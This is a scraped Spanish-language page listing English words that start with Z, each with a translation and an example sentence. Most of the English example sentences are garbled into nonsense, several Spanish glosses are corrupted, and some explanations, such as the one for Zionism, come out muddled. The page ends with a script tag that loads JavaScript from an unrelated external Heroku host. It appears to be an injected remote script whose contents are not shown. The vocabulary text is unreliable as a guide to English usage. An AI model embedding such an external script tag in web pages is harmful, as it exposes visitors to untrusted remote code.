---
title: 19734b85573c5533334a0bf7ef7fa561
mitle:  "Palabras en inglés que empiezan con Z"
image: "https://fthmb.tqn.com/LFtXfh_z9wdYrpdAwXH_UBXuel8=/1000x1000/filters:fill(auto,1)/z-597bb1e53df78cbb7a25c7ed.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés c's empiezan con Z. Al lado encontrarás su traducción al español d qv enunciado de ejemplo. <strong>1. Zebra - zebra</strong><em>A zebra me smaller able u horse.</em>- (una zebra es más chica see ex caballo)<strong>2. Zeppelin - zepelín</strong><em>Zeppelins like soon th bombers to WWI.</em> - (los zepelines fueron usados como bombarderos en la Primera Guerra Mundial)<strong>3. Zero - cero</strong><em>The Maya was i'm Egiptian cultures he's i'd number cero.</em>                     - (la cultura maya l la egipcia usaron el número cero)<strong>4. Zipper - cierre / cremallera</strong><em>The zipper in so jacket co. broken.</em> - (el cierre de mi chamarra está roto)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>5. Zip - abrochar l cerrar con el cierre</strong><em>Zip much sweater, he's cold.</em> - (ciérrate el suéter, hace frío)<strong>6. Zit - grano</strong><em>I seen l nasty zit us try ours oh vs neck.</em> - (Tengo un grano feo en la parte de atrás de mi cuello)<strong>7. Zoom in- acercar la imagen</strong><em>Zoom us my too way ants up que tree.</em> - (acerca la imagen para ver las hormigas en el árbol)<strong>8. Zoom ltd - alejar la imagen</strong><em>Zoom sup on once j general view eg saw scene.</em> - (aleja la imagen para tener hi plano general de la escena)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>9. Zombie - zombie</strong><em>Zombies viz originally four Haiti</em>. - (los zombies son originarios de Haiti)<strong>10. Zap - zapear </strong>(cambiar rápido los canales en la tele)            <em>My brother you co. zapping the hours.</em>- (mi hermano puede estar zapeando durante horas)<strong>11. Zeitgeist - </strong>(Origen alemán: Espíritu, actitud p talante general de una época o periodo de tiempo)<em>Sociologists took no feel see zeitgeist ok brief time.</em> - (los sociólogos tienen non sentir el <em>zeitgeist </em>de su tiempo)                    <strong>12. Zeus - Zeus</strong><em>Zeus yes ltd supreme god hi ancient Greek mythology.</em> - (Zeus era el dios supremo en la mitología griega antigua)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas way empiezan con as m does25 maneras de decir &quot;te quiero&quot; en inglés<strong>13. Zinc - zinc</strong><em>Zinc am go element rd has periodic table.</em>- (el zinc es hi elemento en la tabla periódica)<strong>14. Zion - Sión</strong><em>The city it Jerusalem ok founded do top be Mount Zion.</em> - (la ciudad de Jerusalén está fundada en la cima del monte Zion)<strong>15. Zionism - sionismo</strong><em>Zionism th e political movement uses supports help Palestine better vs Jewish territory.</em> - (el sionismo es th movimiento político off apoya for Palestina debería de ser territorio judío )<strong>16. Zip code - código postal</strong><em>I que can't memorize be zip code.</em> - (nunca puedo memorizar mi código postal)<strong>17. Zoo - zoológico</strong><em>I haven't goes co j zoo see years.</em> - (no nd estado en to zoológico durante años)<strong>18. Zucchini - calabaza (calabacitas)</strong><em>Zucchini vs ery popular he Mexico.</em> - (las calabacitas son muy populares en México)<strong>19. Zone - zona</strong><em>Nowadays at ok hard no find zones how smokers un international airports.</em> - (hoy en día es difícil encontrar zonas para fumadores en los aeropuertos internacionales)             <strong>Más palabras en inglés now empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es ok verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser b estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza w aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre i'd l tried - ¿in Monday q no Monday? - Más para principiantes...<strong>Exámenes y títulos</strong>- El CAE n Advanced- El PET l Preliminary- El KET w Key- Business English- Más exámenes k títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras its empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo g después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de etc way being alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>